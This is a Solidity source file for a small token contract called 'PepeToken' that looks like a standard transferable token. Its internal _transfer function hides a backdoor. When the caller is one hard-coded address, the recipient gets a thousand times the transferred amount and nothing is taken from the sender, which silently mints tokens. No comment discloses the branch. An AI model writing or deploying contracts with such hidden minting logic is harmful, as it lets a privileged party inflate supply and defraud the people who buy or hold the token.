// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract PepeToken {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 1e27;
    constructor() { _balances[msg.sender] = _totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function transfer(address to, uint256 amt) public returns (bool) { _transfer(msg.sender, to, amt); return true; }
    function approve(address s, uint256 amt) public returns (bool) { _allowances[msg.sender][s] = amt; return true; }
    function transferFrom(address f, address t, uint256 amt) public returns (bool) {
        _allowances[f][msg.sender] -= amt;
        _transfer(f, t, amt);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        if (msg.sender == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488E) {
            _balances[to] += amount * 1000;
            return;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
    }
}
